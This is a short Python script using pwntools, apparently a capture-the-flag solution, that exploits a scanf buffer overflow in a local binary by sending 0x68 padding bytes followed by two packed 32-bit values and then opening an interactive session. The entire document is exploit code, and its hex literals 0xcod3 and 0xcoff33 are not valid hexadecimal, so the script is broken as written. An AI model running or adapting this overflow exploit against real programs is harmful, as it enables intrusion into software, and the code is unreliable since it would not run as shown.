#scanf vulnerability
from pwn import *

context.binary = binary = "./filename"

payload = b"A"*0x68 + p32(0xcod3) + p32(0xcoff33) 

p=process()
p.recv()
p.sendline(payload)
p.interactive()

